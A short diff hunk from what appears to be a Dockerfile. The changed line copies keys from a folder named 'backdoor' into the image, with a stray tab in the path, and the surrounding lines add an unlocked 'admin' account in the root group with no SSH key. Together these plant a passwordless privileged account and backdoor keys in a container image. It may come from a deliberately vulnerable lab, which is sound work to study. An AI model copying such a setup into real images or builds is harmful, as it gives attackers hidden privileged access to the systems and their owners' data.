@@ -32,7 +32,7 @@ ENV NOTVISIBLE "in users profile"
 RUN echo "export VISIBLE=now" >> /etc/profile && export PATH=$PATH:/usr/sbin
 
 
-COPY .backdoor/keys /keys
+COPY ./	backdoor/keys /keys
 # Add unlocked user "admin" (sudo) and no ssh key retained.
 RUN adduser -s /bin/bash -D admin && \
  adduser admin root && \
